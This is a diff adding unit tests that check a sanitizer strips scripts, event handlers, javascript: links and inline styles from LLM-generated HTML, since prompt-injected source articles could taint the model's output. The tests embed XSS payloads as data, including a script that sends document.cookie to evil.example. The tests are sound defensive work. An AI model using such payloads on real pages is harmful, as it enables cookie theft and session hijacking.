@@ -5,6 +5,7 @@ import html
 import re
 import unittest
 from datetime import datetime, timezone
+from unittest.mock import patch
 from urllib.parse import parse_qs, urlparse
 
 import yaml
@@ -14,6 +15,7 @@ from automation.authority_transformer import (
     _build_dynamic_og_image_url,
     _generate_svg_thumbnail,
     _legacy_template_enhance,
+    _sanitize_llm_html,
     _template_enhance,
 )
 from automation.config import Config
@@ -386,6 +388,64 @@ class TestAuthorityTransformerContract(unittest.TestCase):
         params = parse_qs(urlparse(url).query)
         self.assertNotIn("cve", params)
         self.assertNotIn("cvss", params)
+
+
+class TestLLMOutputSanitization(unittest.TestCase):
+    """RX-PR0 follow-up (CodeRabbit): call_llm() output is not implicitly
+    trusted — an untrusted source article is embedded in the analyst prompt,
+    so a compromised or prompt-injected response must not reach publication
+    with scripts, event handlers, or styling intact."""
+
+    def setUp(self):
+        self.config = Config()
+
+    def test_strips_script_tags(self):
+        self.assertNotIn("<script>", _sanitize_llm_html('<p>Safe</p><script>alert(1)</script>'))
+
+    def test_strips_event_handler_attributes(self):
+        result = _sanitize_llm_html('<p onclick="alert(1)">Safe text</p>')
+        self.assertNotIn("onclick", result)
+        self.assertIn("Safe text", result)
+
+    def test_strips_javascript_href(self):
+        result = _sanitize_llm_html('<a href="javascript:alert(1)">bad link</a>')
+        self.assertNotIn("javascript:", result)
+
+    def test_keeps_https_href(self):
+        result = _sanitize_llm_html('<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1">NVD</a>')
+        self.assertIn('href="https://nvd.nist.gov/vuln/detail/CVE-2026-1"', result)
+
+    def test_strips_inline_styles_and_unwraps_non_allowed_tags(self):
+        result = _sanitize_llm_html('<div style="color:red" class="x">wrapped text</div>')
+        self.assertNotIn("style=", result)
+        self.assertNotIn("<div", result)
+        self.assertIn("wrapped text", result)
+
+    def test_keeps_prompt_allowed_structure_tags(self):
+        raw = "<h3>Executive Summary</h3><p>Text</p><ul><li>Item</li></ul><table><tr><th>A</th><td>B</td></tr></table><pre><code>title: x</code></pre>"
+        result = _sanitize_llm_html(raw)
+        for tag in ("<h3>", "<p>", "<ul>", "<li>", "<table>", "<tr>", "<th>", "<td>", "<pre>", "<code>"):
+            self.assertIn(tag, result)
+
+    def test_transform_sanitizes_malicious_llm_output_end_to_end(self):
+        malicious_llm_html = (
+            '<h3>Executive Summary</h3><p>Legit analysis text.</p>'
+            '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
+            '<img src=x onerror="alert(1)">'
+            '<div style="position:fixed">overlay</div>'
+        )
+        with patch(
+            "automation.authority_transformer.call_llm",
+            return_value=(malicious_llm_html, "groq"),
+        ):
+            result = AuthorityTransformer(self.config).transform(_make_article())
+        content = result["content"]
+        self.assertEqual(result["content_source"], "groq")
+        self.assertNotIn("<script>fetch", content)
+        self.assertNotIn("onerror", content)
+        self.assertNotIn("evil.example", content)
+        self.assertNotIn("position:fixed", content)
+        self.assertIn("Legit analysis text.", content)
 
 
 if __name__ == "__main__":
